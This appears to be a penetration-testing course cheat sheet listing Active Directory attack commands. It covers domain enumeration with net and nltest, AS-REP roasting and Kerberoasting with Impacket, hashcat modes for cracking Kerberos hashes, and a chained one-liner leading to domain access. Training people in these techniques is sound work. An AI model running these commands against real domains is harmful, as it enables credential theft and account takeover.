# Module 17: Active Directory I Commands

### 1. Enumerating the Domain
| Command | Description | Use Case |
| :--- | :--- | :--- |
| `net user /domain` | List all domain users | Identify targets for roasting. |
| `net group "Domain Admins" /domain` | List domain admins | Find the high-value targets. |
| `nltest /domain_trusts` | Check domain trusts | See if this domain trusts another. |

### 2. Impacket Tools (The AD Powerhouse)
Impacket is a collection of Python classes for working with network protocols.

**AS-REP Roasting:**
```bash
# Get the hash for a specific user
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat
```

**Kerberoasting:**
```bash
# Find and roast service tickets
impacket-GetUserSPNs -dc-ip <dc_ip> -request
```

### 3. Cracking AD Hashes
AD hashes (Kerberos) are different from NT hashes. Use the correct Hashcat mode:
- **Kerberos 5 TGS-REP (Kerberoasting)**: `-m 13100`
- **Kerberos 5 AS-REP**: `-m 18200`

**Example:**
`hashcat -m 13100 hashes.txt rockyou.txt`

### The "AD Entry Chain":
Find domain users $\rightarrow$ Check for pre-auth disabled $\rightarrow$ AS-REP Roast $\rightarrow$ Crack password $\rightarrow$ Domain Access:
```bash
net user /domain && impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.1 -format hashcat
```
